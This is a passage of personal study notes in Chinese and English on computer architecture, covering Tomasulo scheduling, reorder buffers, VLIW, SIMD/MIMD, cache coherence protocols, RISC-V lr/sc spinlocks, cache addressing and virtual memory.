</ul>
</li>
</ul>
<p><img src="Basic/Architecture/../images/image-20211118183301433.png" alt="image-20211118183301433" /></p>
</li>
<li>
<p>记录寄存器的使用状态 </p>
<p><img src="Basic/Architecture/../images/image-20211118183228814.png" alt="image-20211118183228814" /></p>
</li>
</ol>
<h3 id="如何解决冲突"><a class="header" href="#如何解决冲突">如何解决冲突</a></h3>
<ol>
<li>结构冲突：我们会记录执行部件的busy情况，从issue之后，就标记成busy，直到write完成。</li>
</ol>
<h2 id="tomasulo"><a class="header" href="#tomasulo">Tomasulo</a></h2>
<img src="Basic/Architecture/../images/image-20211117151313118.png" alt="image-20211117151313118" style="zoom:67%;" />
<h3 id="执行流程-1"><a class="header" href="#执行流程-1">执行流程</a></h3>
<ol>
<li>Issue - Get the next instruction from the head of the <strong>instruction queue</strong>, which is maintained in FIFO order to ensure the maintenance of correct data flow. 
<ul>
<li>If there is a matching <strong>reservation station</strong> that is empty, issue the instruction to the station with the <u>operand values</u>, if they are currently in the <strong>registers</strong>. </li>
<li>If there is not an empty reservation station, then there is a structural hazard, and the instruction issue <strong>stalls</strong> until a station or buffer is freed. </li>
<li>If the operands are not in the registers, <u>keep track of the functional units that will produce the operands</u>. <u>This step renames registers, eliminating WAR and WAW hazards.</u> (This stage is sometimes called dispatch in a dynamically scheduled processor.)</li>
</ul>
</li>
<li>Execute - 
<ul>
<li>If one or more of the operands is not yet available, monitor the <strong>common data bus</strong> while waiting for it to be computed. When an operand becomes available, it is placed into any reservation station awaiting it. </li>
<li>When all the operands are available, the operation can be executed at the corresponding functional unit. By delaying instruction execution until the operands are available, RAW hazards are avoided. </li>
</ul>
</li>
<li>Write result - When the result is available, write it on the <strong>CDB</strong> and from there into the <strong>registers</strong> and into any <strong>reservation stations</strong> (including <strong>store buffers</strong>) waiting for this result. Stores are buffered in the store buffer until both the value to be stored and the store address are available; then the result is written as soon as the memory unit is free.</li>
</ol>
<p>Tomasulo和Scoreboard的重要区别在于：Tomasulo中，指令发射到Reservation station后，源寄存器号都会丢弃掉，取而代之的是Reservation station的标签或者是真实的值。这样就顺便完成了rename的工作。</p>
<h3 id="记录信息-1"><a class="header" href="#记录信息-1">记录信息</a></h3>
<p>Each <strong>reservation station</strong> has seven fields:</p>
<ul>
<li>Op - The operation to perform on source operands S1 and S2. </li>
<li>Qj, Qk - The reservation stations that will produce the corresponding source operand; a value of zero indicates that the source operand is already available in Vj or Vk, or is unnecessary.</li>
<li>Vj, Vk - The value of the source operands. Note that only one of the V fields or the Q field is valid for each operand. For loads, the Vk field is used to hold the offset field.</li>
<li>A - Used to hold information for the memory address calculation for a load or store. Initially, the immediate field of the instruction is stored here; after the address calculation, the effective address is stored here.</li>
<li>Busy - Indicates that this reservation station and its accompanying functional unit are occupied.</li>
</ul>
<p>除此外，还需要记录每个寄存器的状态，在等待哪个执行部件的输出（或者说被重命名成什么寄存器了）。</p>
<p><img src="Basic/Architecture/../images/image-20211119224341971.png" alt="image-20211119224341971" /></p>
<h3 id="如何解决冲突-1"><a class="header" href="#如何解决冲突-1">如何解决冲突</a></h3>
<ul>
<li>RAW: 当我们ISSUE指令的时候，如果发现我们的操作数还没有就绪（可以查看Register Status表），就指向写那个寄存器的Reservation Station</li>
<li>WAR：当我们读取寄存器的时候，如果就绪，就直接把寄存器的值读过来，而不需要读取他的序号。（Vi，Vj）</li>
<li>WAW：我们在考虑冲突的时候并没有考虑要写的寄存器，我们可以直接把Register Status对应的项目换掉。</li>
<li>结构冲突：待执行的指令都保存在reservation stations.</li>
</ul>
<h2 id="hardware-based-speculation"><a class="header" href="#hardware-based-speculation">Hardware-based speculation</a></h2>
<p><img src="Basic/Architecture/../images/image-20211124143911859.png" alt="image-20211124143911859" /></p>
<p>对比一般的Tomasulo算法，这里加了一个ROB(ReOrder Buffer)。In this way, when the prediction fails, it is easy to restore the inferred execution instruction, or when an exception occurs, it is easy to restore the state。总结的说，只有<strong>真正需要写回</strong>的指令才会<strong>按序</strong>写回。</p>
<h3 id="执行流程-2"><a class="header" href="#执行流程-2">执行流程</a></h3>
<p>前三个和Tomasulo一样。</p>
<ol>
<li>Issue—get instruction from FP Op Queue</li>
<li>Execution—operate on operands (EX)</li>
<li>Write result—finish execution (WB)</li>
<li><strong>Commit—update register with reorder result</strong></li>
</ol>
<p>The key idea behind implementing speculation is to <strong>allow instructions to execute out of order but to force them to commit in order and to prevent any irrevocable action (such as updating state or taking an exception)</strong> until an instruction commits. The reorder buffer (ROB) provides additional registers in the same way as  the reservation stations in Tomasulo’s algorithm extend the register set.</p>
<h3 id="记录信息-2"><a class="header" href="#记录信息-2">记录信息</a></h3>
<p><img src="Basic/Architecture/../images/image-20211124145730323.png" alt="image-20211124145730323" /></p>
<hr />
<p>一个例子：Add instruction needs 2 clock cycles. Multiply instruction needs 10 clock cycles. Division instruction needs 40 clock cycles. LD instruction need 1 clock cycles.</p>
<p>Scoreboard: </p>
<div class="table-wrapper"><table><thead><tr><th>instruction</th><th>Fi</th><th>Fj</th><th>Fk</th><th>issue</th><th>read</th><th>execute</th><th>write</th></tr></thead><tbody>
<tr><td>FLD</td><td>F6</td><td>34+R2</td><td></td><td>1</td><td>2</td><td>3</td><td>4</td></tr>
<tr><td>FLD(等FLD)</td><td>F2</td><td>45+R3</td><td></td><td>5</td><td>6</td><td>7</td><td>8</td></tr>
<tr><td>FMUL</td><td>F0</td><td>F2(等FLD)</td><td>F4</td><td>6</td><td>7-9</td><td>10-19</td><td>20</td></tr>
<tr><td>SUB</td><td>F8</td><td>F2(等FLD)</td><td>F6</td><td>7</td><td>8-9</td><td>10-11</td><td>12</td></tr>
<tr><td>DIV</td><td>F10</td><td>F0(等FMUL)</td><td>F6</td><td>8</td><td>21</td><td>22-61</td><td>62</td></tr>
<tr><td>ADD(等SUB)</td><td>F6(等DIV)</td><td>F8</td><td>F2</td><td>13</td><td>14</td><td>15-16</td><td>22</td></tr>
</tbody></table>
</div>
<p>Tomasulo:</p>
<div class="table-wrapper"><table><thead><tr><th>instruction</th><th>Fi</th><th>Fj</th><th>Fk</th><th>issue</th><th>execute</th><th>write</th></tr></thead><tbody>
<tr><td>FLD</td><td>F6</td><td>34+R2</td><td></td><td>1</td><td>2</td><td>3</td></tr>
<tr><td>FLD</td><td>F2</td><td>45+R3</td><td></td><td>2</td><td>3</td><td>4</td></tr>
<tr><td>FMUL</td><td>F0</td><td>F2(等FLD)</td><td>F4</td><td>3</td><td>5-14</td><td>15</td></tr>
<tr><td>SUB</td><td>F8</td><td>F2(等FLD)</td><td>F6</td><td>4</td><td>5-6</td><td>7</td></tr>
<tr><td>DIV</td><td>F10</td><td>F0(等FMUL)</td><td>F6</td><td>5</td><td>16-55</td><td>56</td></tr>
<tr><td>ADD(等SUB)</td><td>F6(等DIV)</td><td>F8</td><td>F2</td><td>6</td><td>8-9</td><td>10</td></tr>
</tbody></table>
</div>
<p>Hardware speculation:</p>
<div class="table-wrapper"><table><thead><tr><th>instruction</th><th>Fi</th><th>Fj</th><th>Fk</th><th>issue</th><th>execute</th><th>write</th><th>commit</th></tr></thead><tbody>
<tr><td>FLD</td><td>F6</td><td>34+R2</td><td></td><td>1</td><td>2</td><td>3</td><td>4</td></tr>
<tr><td>FLD</td><td>F2</td><td>45+R3</td><td></td><td>2</td><td>3</td><td>4</td><td>5</td></tr>
<tr><td>FMUL</td><td>F0</td><td>F2</td><td>F4</td><td>3</td><td>5-14</td><td>15</td><td>16</td></tr>
<tr><td>SUB</td><td>F8</td><td>F2</td><td>F6</td><td>4</td><td>5-6</td><td>7</td><td>17</td></tr>
<tr><td>DIV</td><td>F10</td><td>F0</td><td>F6</td><td>5</td><td>16-55</td><td>56</td><td>57</td></tr>
<tr><td>ADD(等SUB)</td><td>F6</td><td>F8</td><td>F2</td><td>6</td><td>8-9</td><td>10</td><td>58</td></tr>
</tbody></table>
</div>
<h2 id="多发射和静态调度"><a class="header" href="#多发射和静态调度">多发射和静态调度</a></h2>
<ol>
<li>静态调度超标量处理器。</li>
<li>VLIW( 超长指令字)处理器。</li>
<li>动态调度超标量处理器。</li>
</ol>
<h3 id="vliw-very-long-instruction-word"><a class="header" href="#vliw-very-long-instruction-word">VLIW (Very Long Instruction Word)</a></h3>
<p>超长指令字（VLIW：Very long instruction word）指的是一种被设计为可以利用指令级并行（ILP）优势的CPU体系结构。其主要思想是：</p>
<ul>
<li>将多个相互无依赖的指令封装到一条超长的指令字中</li>
<li>CPU中有对应数量的ALU完成相应的指令操作</li>
<li>指令之间的依赖性和调度由<strong>编译器</strong>来完成</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>架构特征</th><th>CISC</th><th>RISC</th><th>VLIW</th></tr></thead><tbody>
<tr><td>指令长度</td><td>变长</td><td>固定，通常32 bits</td><td>固定</td></tr>
<tr><td>指令格式</td><td>字段布局可变</td><td>字段布局固定一致</td><td>字段布局固定一致</td></tr>
<tr><td>指令语义</td><td>指令从简单到复杂变化，每条指令可能有许多依赖操作</td><td>每个指令的语义几乎总是一个简单的操作</td><td>多数指令是简单、独立的操作</td></tr>
<tr><td>寄存器</td><td>较少，部分为专用寄存器</td><td>较多通用寄存器</td><td>较多通用寄存器</td></tr>
<tr><td>内存引用方式</td><td>与许多不同类型指令中的操作捆绑在一起</td><td>不与操作捆绑在一起，如，Load/Store架构</td><td>不与操作捆绑在一起，如，Load/Store架构</td></tr>
<tr><td>硬件设计</td><td>利用微码实现</td><td>采用单条流水线、不使用微码</td><td>采用多条流水线、不使用微码和复杂的指令调度逻辑</td></tr>
</tbody></table>
</div>
<p>https://zhuanlan.zhihu.com/p/337749676</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="simd和mimd"><a class="header" href="#simd和mimd">SIMD和MIMD</a></h1>
<p>一个经典的控制流和数据流的弗林分类法。I:Instruction D:Data</p>
<p><img src="Basic/Architecture/../images/image-20211208140656522.png" alt="image-20211208140656522" /></p>
<p>SISD机器是一种传统的串行计算机，它的硬件不支持任何形式的并行计算，所有的指令都是串行执行。并且在某个时钟周期内，CPU只能处理一个数据流。因此这种机器被称作单指令流单数据流机器。早期的计算机都是SISD机器，如冯诺.依曼架构。而MISD没有在实际中使用。</p>
<h2 id="smid"><a class="header" href="#smid">SMID</a></h2>
<p>SIMD是采用一个指令流处理多个数据流。这类机器在数字信号处理、图像处理、以及多媒体信息处理等领域非常有效。</p>
<img src="Basic/Architecture/../images/v2-1ab804cd96bae7000e040bfca2652be1_720w.png" alt="img" style="zoom:80%;" />
<h3 id="vector-processor"><a class="header" href="#vector-processor">Vector Processor</a></h3>
<p>以计算 $D=A\times(B+C)$ 为例（ABCD都是1*n的向量）</p>
<ul>
<li>Horizontal processing method
<ul>
<li>$d_1 = a_1\times(b_1+c_1)$</li>
<li>$d_2 = a_2\times(b_2+c_2)$</li>
<li>$d_n = a_n\times(b_n+c_n)$</li>
</ul>
</li>
</ul>
<h3 id="cray-1"><a class="header" href="#cray-1">CRAY-1</a></h3>
<p><img src="Basic/Architecture/../images/image-20211208182155120.png" alt="image-20211208182155120" /></p>
<h3 id="rv64v"><a class="header" href="#rv64v">RV64V</a></h3>
<p><img src="Basic/Architecture/../images/image-20211208173449346.png" alt="image-20211208173449346" /></p>
<h3 id="array-processor"><a class="header" href="#array-processor">Array Processor</a></h3>
<p>ICN interconnection</p>
<p>PM2I</p>
<h2 id="mimd"><a class="header" href="#mimd">MIMD</a></h2>
<p>MIMD机器可以同时执行多个指令流，这些指令流分别对不同数据流进行操作。最新的多核计算平台就属于MIMD的范畴。</p>
<img src="Basic/Architecture/../images/v2-c57263ddd437016913f8916ec1b3e042_720w.png" alt="img" style="zoom:50%;" />
<h3 id="smp"><a class="header" href="#smp">SMP</a></h3>
<p>SMP有两种解释（一个意思）symmetric (shared-memory) multiprocessors 或者 centralized shared-memory multiprocessors。其特点是核心数目较少，通常不超过32个。由于此类多处理器中的处理器数目如此之小，所以处理器有可能<strong>共享一个集中式存储器</strong>，所有处理器能够平等地访问它。</p>
<p><img src="Basic/Architecture/../images/image-20211208180356944.png" alt="image-20211208180356944" /></p>
<h3 id="dsm"><a class="header" href="#dsm">DSM</a></h3>
<p>在另一种设计方法中，多处理器采用物理分布式存储器，称为分布式共享存储器 (DSM distributed shared memory)。为了支持更多的处理器，存储器必须分散在处理器之间，而不应当是集中式的;否则，存储器系统就无法在不大幅延长访问延迟的情况下为大量处理器提供带宽支持。</p>
<p><img src="Basic/Architecture/../images/image-20211208180340141.png" alt="image-20211208180340141" /></p>
<p>这样子每个处理器访问本地的存储的速度快了，但是在处理器之间传输数据就变得复杂了。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tlp"><a class="header" href="#tlp">TLP</a></h1>
<p>线程级并行 (TLP) 意味着存在多个程序计数器，因此主要通过 MIMD 加以开发。为了充分利用拥有 <strong>n 个处理器</strong>的 MIMD 多处理器,通常必须拥有至少 n 个要执行的线程或进程。主要有下面两个模型：</p>
<p>UMA(Unified Memory Access，一致存储器访问)，也叫SMP(symmetric/shared-memory multiprocessors，对称共享存储器多处理器或集中式共享存储器多处理器)。他的特点是<strong>所有处理器访问存储器的延迟都是一致的，即使存储器的组织方式被分成多个组也是如此</strong>。</p>
<p>NUMA(Non-Unified Memory Access，非一致存储器访问)，也叫DSP(distributed shared-memory multiprocessor)。特点是<strong>存储器分散在处理器之间，而不是集中式的</strong>。访问本地存储器会很快，远远高于访问远端存储器的速度。但是存储器直接通信的成本较高。</p>
<p><img src="Basic/Architecture/../images/image-20220101135651310.png" alt="image-20220101135651310" /></p>
<h2 id="cache-coherence"><a class="header" href="#cache-coherence">Cache coherence</a></h2>
<h3 id="snooping-star"><a class="header" href="#snooping-star">Snooping :star:</a></h3>
<p>采用SMP的计算机通常支持对<strong>共享数据Shared data</strong>和<strong>专用数据Private data</strong>的缓存：</p>
<ul>
<li>Private data: 供单个处理器使用</li>
<li>Shared data: 供多个处理器使用。这意味着cache中的共享数据可能存在多份复制，多份复制可以减少争用（读），但是也带来了<strong>缓存一致性</strong>（写）的问题。
<ul>
<li>Cache1 A=10, Cache2 A=10. 如果这个时候我写了Cache2 A=20, 怎么同步到Cache1呢？</li>
</ul>
</li>
</ul>
<p>一种方法是确保处理器在写入某一数据项之前,获取对该数据项的独占访问。这种类型的协议被称为写入失效协议( write invalid protocal) ,因为它在执行写入操作时会使其他副本失效。</p>
<blockquote>
<p>这个也是很常用的思想了。读写锁只能有一个Writer，可变引用Rust同时只能存在一个。</p>
</blockquote>
<p><img src="Basic/Architecture/../images/image-20220101143433758.png" alt="例子" /></p>
<p>那么关键在于，如何执行失效操作，一般使用总线或其他广播介质来执行失效操作。在写入一个共享块时，执行写入操作的处理器必须<strong>获取总线访问权限来广播其失效</strong>。如果我们采用write through策略，那么我们在发现失效的时候直接从下级存储中读取就可以了；但是如果我们使用write back策略，那么每个处理器也应该<strong>监听总线上的地址请求，如果发现自己拥有被请求的内容的脏副本，那么应该回应该请求并且禁止下级存储响应该请求</strong>。</p>
<h4 id="msi"><a class="header" href="#msi">MSI</a></h4>
<p>具体的，我们有<strong>MSI协议</strong>，这个协议有三个状态：</p>
<ul>
<li>Modified: 标记的块被修改了，这时这个块应该被我独占了。</li>
<li>Shared: 标记的块可能被共享了。</li>
<li>Invalid: 标记的块的内容没有意义。</li>
</ul>
<p>采用了write back策略的如下，对于write through，只需要将己修改状态重新解读为独占状态，并在执行写入操作时以正常方式更新缓存。</p>
<p><img src="Basic/Architecture/../images/image-20220101150551857.png" alt="image-20220101150551857" /></p>
<p><img src="Basic/Architecture/../images/image-20220101150804721.png" alt="image-20220101150804721" /></p>
<p>True sharing miss：在<strong>第一次</strong>写shared block时，会产生一次失效把块声明成exclusive称为True sharing miss。或者是如果因为写入块中的<strong>某个字</strong>，而导致一个块失效。如果后续读该块中的<strong>任何字</strong>，都会失效。如果导致失效的字和读取的字<strong>是同一个字</strong>。</p>
<p>False sharing miss：如果因为写入块中的<strong>某个字</strong>，而导致一个块失效。如果后续读该块中的<strong>任何字</strong>，都会失效。如果导致失效的字和读取的字<strong>不是同一个字</strong>，我们就称这种现象为False sharing miss。</p>
<h4 id="mesi"><a class="header" href="#mesi">MESI</a></h4>
<p>exclusive:indicates when a cache block is resident only in a single cache but is clean</p>
<ul>
<li>exclusive-&gt;read by others-&gt;shared</li>
<li>exclusive-&gt;write-&gt;modified</li>
</ul>
<p>添加这一状态的好处在于：在由同一核心对处于独占状态的块进行后续写入时，不需要访问总线，也不会生成失效操作，因为处理器知道这个块在这个本地缓存中是独占的；处理器只是将状态改为已修改。</p>
<h4 id="moesi"><a class="header" href="#moesi">MOESI</a></h4>
<p>owned:indicates that the associated block is owned by that cache and out-of-date in memory</p>
<p>在 MSI 和 MESI 协议中，如果尝试共享处于modified状态的块，会将其状态改为shared (在原共享缓存和新共享缓存中都会做此修改)<strong>并必须将这个块写回存储器中</strong>。而在 MOESI 协议中，会在原缓存中将这个块的状态<strong>由modified改为owned。而不写到存储器中</strong>。(新共享这个块的)其他缓存使这个块保持shared状态；只有原缓存保持owned状态，<strong>表示主存储器副本已经过期，指定缓存成为其拥有者</strong>。这个块的拥有者必须在发生缺失时提供该块，因为存储器中没有最新内容；如果替换了这个块，则必须将其写回存储器中。</p>
<h4 id="directory-based-coherence"><a class="header" href="#directory-based-coherence">Directory-Based Coherence</a></h4>
<p>之前介绍的snooping，因为需要在缓存缺失的时候和所有的缓存通信，所以不适合总线式系统DSP。我们有目录式协议。</p>
<p>目录中保存了每个可缓存块的状态。这个目录中的信息包括哪些缓存(或缓存集合)拥有这个块的副本，它是否需要更新，等等。在一个拥有共享最外层缓存(即 L3) 的多核心中，实现目录机制比较容易：只需要为每个L3块保存一个位向量，其大小等于核心的数目。这个位向量表示哪些专用缓存的 L3 中可能拥有一个块的副本，失效操作仅会发送给这些缓存。如果 L3 是包含性的，那这一方法对于单个多核心是非常有效的，在Intel i7 中就是采用了这一机制。</p>
<p><img src="Basic/Architecture/../images/image-20220101205521761.png" alt="image-20220101205521761" /></p>
<ul>
<li>Shared—One or more nodes have the block cached, and the value in memory is up to date (as well as in all the caches).</li>
<li>Uncached—No node has a copy of the cache block.</li>
<li>Modified—Exactly one node has a copy of the cache block, and it has written the block, so the memory copy is out of date. The processor is called the owner of the block.</li>
</ul>
<p>每个缓存中状态机的状态与转换都和监听缓存中使用的状态机相同,只不过在发生转换时的操作稍有不同。用于定位一个数据项独占剧本并使其失效的过程有所不同,因为它们需要在发出请求的节点与目录之间进行通信,在目录与一或多个远程节点进行通信。在监听式协议中,这两个步骤通过向所有节点进行广播而结合在一起。</p>
<p><img src="Basic/Architecture/../images/image-20220101213205979.png" alt="image-20220101213205979" /></p>
<h2 id="synchronization"><a class="header" href="#synchronization">Synchronization</a></h2>
<p>软件提供的同步方法依赖于硬件提供的简单同步方法。对于硬件来说，The key hardware capability is an <strong>uninterruptible instruction</strong> or instruction sequence capable of <strong>atomically retrieving and changing a value</strong>.</p>
<p>我们来看如何使用硬件元语来构建锁。</p>
<h3 id="atomic-memory-operation"><a class="header" href="#atomic-memory-operation">Atomic memory operation</a></h3>
<p>One typical operation for building synchronization operations is the <strong>atomic exchange, which interchanges a value in a register for a value in memory</strong>. To see how to use this to build a basic synchronization operation, assume that we want to build a simple lock where the value 0 is used to indicate that the lock is free and 1is used to indicate that the lock is unavailable.</p>
<p>A processor tries to set the lock by doing an exchange of 1, which is in a register, with the memory address corresponding to the lock. The value returned from the exchange instruction is 1 if some other processor had otherwise already claimed access and 0. In the latter case, the value is also changed to 1, preventing any competing exchange from also retrieving a 0.</p>
<p>与之类似的还有</p>
<ul>
<li><code>test-and-set</code>: tests a value and sets it if the value passes the test. For example, we could define an
operation that tested for 0 and set the value to 1, which can be used in a fashion similar to how we used atomic exchange.</li>
<li><code>fetch-and-increment</code>: it returns the value of a memory location and atomically increments it. By using the value 0 to indicate that the synchronization variable is unclaimed, we can use fetch-and-increment, just as we used exchange.</li>
</ul>
<p>实现单个原子存储器操作会引入一些挑战，因为它需要在单个不可中断的指令中进行存储器读取与写入操作。这一要求增加了一致性实施的复杂性，因为硬件不允许在读取与写入之间插入任何其他操作，而且不能死锁。</p>
<p>替代方法是利用一对指令，其中第二条指令可以返回一个值，根据这个值可以判断这一对指令是否以原子形式执行。如果任一处理器执行的所有其他指令要么在这对指令之前执行，可么在这对指令之后执行，那就可以认为这对指令具有原子性。RISCV就采用了这种做法。</p>
<p><img src="Basic/Architecture/../images/image-20220102133353954.png" alt="image-20220102133353954" /></p>
<ul>
<li><code>lr rd, (rs1)</code> : load reserved. 
<ul>
<li><code>LR.W</code> loads a word from the address in <code>rs1</code>, places the sign-extended value in rd, and <strong>registers a reservation on the memory address</strong> and a range of bytes including at least all bytes of the addressed word.</li>
</ul>
</li>
<li><code>sc rd, rs2, (rs1)</code>: store conditional.
<ul>
<li><code>SC.W</code> writes a word in <code>rs2</code> to the address in <code>rs1</code>, provided a valid reservation still exists on that address. </li>
<li><code>SC.W</code> writes zero to <code>rd</code> on success or a nonzero code on failure. </li>
</ul>
</li>
</ul>
<p>我们可以用它来构造上面的同步元语，比如fetch-and-increase</p>
<pre><code class="language-asm">try: lr x2,(x1)
     addi x3,x2,1
     sc x4,x3,(x1)
     bne x4,x0,try

# 如果 x4 == 0, 说明成功
# 如果 x4 != 0, 说明失败
</code></pre>
<p>在选择向两条指令之间插入的指令时必须非常小心。具体来说,只有寄存器-寄存器指令才是安全的。否则，就有可能<strong>造成死锁情景</strong>，处理器永远无法完成sc。此外，链接载入和条件存储之间的指令数应当很小，以尽可能减少无关事件或竞争处理器导致条件存储频繁失败的情景。</p>
<h2 id="自旋锁"><a class="header" href="#自旋锁">自旋锁</a></h2>
<p>EXCG两个实现方法，第二个实现方法是为了能够针对本地缓存副本进行循环,不需要在每次尝试获取锁时都生成存储器请求。</p>
<pre><code class="language-assembly">lockit: addi x2,R0,1
        EXCH x2,0(x1)	;atomic exchange
        bne  x2,x0,lockit  ;already locked?
        
lockit: ld x2,0(x1)    ;load of lock
        bnez x2,lockit ;not available-spin
        addi x2,x0,1  ;load locked value
        EXCH x2,(x1)  ;swap
        bnez x2,lockit ;branch if lock wasn’t 0
</code></pre>
<pre><code class="language-assembly">lockit: lr   x2,0(x1)
        bnez x2,lockit
        addi x2,x0,1
        sc   x3,x2,(x1)
        bnez x3,lockit
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><p>下面的术语不是很清楚，DRAM指主存，SRAM指Cache。</p>
<h2 id="基本思想"><a class="header" href="#基本思想">基本思想</a></h2>
<p>最简单的模型是 CPU+RAM。</p>
<p>CPU生成一个地址，到DRAM中读写。但是因为CPU的频率很快，而DRAM的频率慢，如果要等会拖慢CPU的速度。所以我们需要用Cache模型来加快速度。而且DRAM不是持久存储，我们还需要硬盘。所以我们得到了下面的复杂模型</p>
<p><img src="Basic/Architecture/../images/201106122243022711.png" alt="img" /></p>
<p>其实每一层都可以看成下一层的缓存，考虑下面这些问题：</p>
<div class="table-wrapper"><table><thead><tr><th></th><th>Block replacement</th><th>Finding a block</th><th>Replacement on a miss</th><th>Write policy</th></tr></thead><tbody>
<tr><td>Cache=&gt;DRAM</td><td>LRU,FIFO,Random</td><td>三种associative</td><td></td><td>write-back/write-through</td></tr>
<tr><td>DRAM=&gt;硬盘</td><td>通常是LRU</td><td>fully associative+页表</td><td></td><td>write-back</td></tr>
</tbody></table>
</div>
<h2 id="cachestar"><a class="header" href="#cachestar">Cache:star:</a></h2>
<h3 id="结构"><a class="header" href="#结构">结构</a></h3>
<p>举一个例子，4KB的Cache，一个word我们约定是64 bits,地址也是64 bits。</p>
<p>一个典型的Cache结构包括</p>
<ol>
<li>Valid ： 表示存储的内容是否有效。</li>
<li>Tag ： 因为Cache比DRAM要小，所以必然会有很多个DRAM中的block映射到同一个Cache中的Block。通过Tag来标识是哪个DRAM中的Block。</li>
<li>Data ： 存储的真正数据。</li>
</ol>
<h3 id="寻址"><a class="header" href="#寻址">寻址</a></h3>
<p>所以，我们拿到一个地址，要如何去Cache中寻找数据呢（下面这个例子是<strong>直接映射</strong>或者说<strong>一路组相连</strong>）</p>
<ol>
<li>首先要找到是Cache中的哪一个Block。注意到我们Block的大小是32 bits(4 bytes)，而Cache的大小是1024个Block。那么我们应该用$log(1024*4)=12$个来寻找byte，其中前10个是index offset用来寻找block，后两个是byte offset来寻找byte。</li>
<li>然后我们要看我们找到的block是不是对应我们真正的DRAM中的block。首先确定$valid=1$。</li>
<li>然后我们地址剩下的$64-12=52$位，就是Tag了。</li>
</ol>
<p>再举一个二路组相连的例子吧。</p>
<ol>
<li>首先要找到是Cache中的哪一个组(set)。注意到我们Block的大小是32 bits(4 bytes)，Set的大小是64 bits(8 bytes)，而Cache的大小是512个set。那么我们应该用$log(512*4)=11$个来寻找byte，其中前9个是index offset用来寻找set，后两个是byte offset来寻找byte。</li>
<li>然后我们要看我们找到的block是不是对应我们真正的DRAM中的block。首先确定$valid=1$。</li>
<li>然后我们的地址剩下的$64-11=53$位就是tag了。要和这个set中的两个block中的tag都进行比较。</li>
</ol>
<p>这边都没有考虑dirty和其他一些用于替换的Metadata占用的空间。</p>
<p><img src="Basic/Architecture/../images/image-20210604134554825.png" alt="image-20210604134554825" /></p>
<h3 id="策略"><a class="header" href="#策略">策略</a></h3>
<p>如果我们读一个一个Block，然后发现他不在Memory中，我们需要从DRAM中读取数据写入Cache。这个时候可能就需要替换Cache中原本block的内容，如果是一路相连的话没什么好说的，但是对于多路组相连，我们有很多替换的选择。</p>
<ol>
<li>LRU。替换掉最远被使用的，对于二路我们只需要一个Bit来记录就好了，但是对于多路我们其实不太好判断哪个是最远没有被使用的。</li>
<li>MRU。替换掉最近被使用的。</li>
<li>Optimal。不现实的做法，替换掉之后最远使用的，但是需要我们未卜先知知道之后的内存访问情况。一般来说还有buffer缓存，否则太慢了。</li>
</ol>
<p>对于写，又有两个策略（instruction cache通常是只读的，data cache是读写的）：</p>
<ol>
<li>write-back: 直接写cache的内容，在cache被替换的时候再写回到DRAM中（所以需要有dirty bit记录是否要写回）。对于Miss的情况，又有两个策略。对于write-back来说一般和write-allocate匹配，我们首先给要写的block在cache中分配一块空间（可能意味着替换和写回），然后再直接修改cache上的block。</li>
<li>write-through: 同时写cache和DRAM的内容。对于Miss的情况，一般用write-around的方式，直接写DRAM；也可以write allocate，但是因为write-throuth保证cache中的内容是和DRAM一致的，所以直接写就完事，不用担心写了cache会。</li>
</ol>
<h3 id="评估"><a class="header" href="#评估">评估</a></h3>
<p>通常我们假设CPU的时间是<strong>Cache命中</strong>的情况。如果Miss的话，我们就需要停顿来等待DRAM数据的加载。 </p>
<p>Average Memory Access Time $AMAT = 命中时间+失效率×失效代价$</p>
<p>写穿透，认为读写失效代价相同，$等待存储访问的时钟周期数 = \frac{访存操作数目}{程序}×写失效率×写失效代价$。需要注意的是，写失效代价要以时钟周期数来衡量，每次执行指令都要访问Instruction memory，然后如果是ld/sd还要再访问一次Data memory。</p>
<h2 id="虚拟地址star"><a class="header" href="#虚拟地址star">虚拟地址:star:</a></h2>
<p><strong>virtual memory</strong>: A technique that uses main memory as a “cache” for secondary storage。</p>
<p>无论是读或写磁盘，我们都需要加载到内存中write back的，而不是用write through，因为写磁盘的代价实在是太大了。</p>
<p>page size，一般是4K</p>
<h3 id="理想的过程"><a class="header" href="#理想的过程">理想的过程</a></h3>
<p>这张图是一个很典型的地址翻译过程，不过没有考虑Page fault的情况</p>
<ol>
<li>CPU解析指令产生了一个地址（虚拟地址）</li>
<li>我们根据虚拟地址的VPN，到TLB里找对应的项。如果hit，就可以找到物理地址PPN。如果Miss，就要到DRAM中查页表来找到物理地址PPN（假设是有效的）。</li>
<li>$PPN|PPO$ 我们就得到了真正的物理地址。</li>
<li>然后再到Cache中寻找，如果hit就找到了真正的数据，如果没命中就得到下级Cache直到DRAM中寻找数据。</li>
</ol>
<p><img src="Basic/Architecture/../images/image-20210606121657373.png" alt="image-20210606121657373" /></p>
<h3 id="三种情况"><a class="header" href="#三种情况">三种情况</a></h3>
<p>虚拟地址可以分三类：可能<strong>在物理内存DRAM</strong>中，也可能在<strong>磁盘</strong>中。当然也可能是<strong>没有意义</strong>的。对应于页表：</p>
<ol>
<li>在物理内存中，那么在页表中对应的valid=1，直接查表可以得到有效的物理地址，就是上面的图那样。</li>
<li>在磁盘中，valid=0，直接查表发生page fault，操作系统通过别的信息知道如何加载进来。把数据从磁盘加载到物理内存中，再修改对应的页表valid=1，转换成第一种情况。</li>
<li>没有意义，valid=0，直接查表发生page fault，操作系统通过别的信息可能产生segment fault。</li>
</ol>
<h3 id="磁盘加载"><a class="header" href="#磁盘加载">磁盘加载</a></h3>
<p>我们再来稍微考虑一下第二种情况，操作系统如何通过别的信息知道加载磁盘的内容。</p>
<p><strong>Linux进程地址空间</strong>可以分成两大类，<strong>文件映射和匿名映射</strong>。文件映射，顾名思义，是指该地址空间的内容来自于一个文件（体现内存作为磁盘的缓存）；而匿名映射地址空间背后什么靠山都没有。进程的代码段来自于镜像，采用文件映射方式；而栈，堆，bss段均是匿名映射。</p>
<p>如果是文件映射，那么就是要在磁盘中加载对应的文件的内容了，然后<strong>分配一个物理页</strong>放进去。如果是匿名映射，就是<strong>分配一个物理页</strong>然后填上0。</p>
<h3 id="页置换"><a class="header" href="#页置换">页置换</a></h3>
<p>再来考虑这样一个问题。上面提到的第二种情况，需要分配物理页来加载磁盘文件（或者匿名文件）。那么操作系统如何管理物理页？如果物理页有空闲的可以直接换进来，但是不够了要怎么办？</p>
<p>不够了，肯定是要选择一个页换出去。我们经常使用近似的LRU算法（就是模糊的统计哪个太久没用了然后换出去）。我们借用RISCV规定的页表项结构来解释策略，关注下面两个bit</p>
<ol>
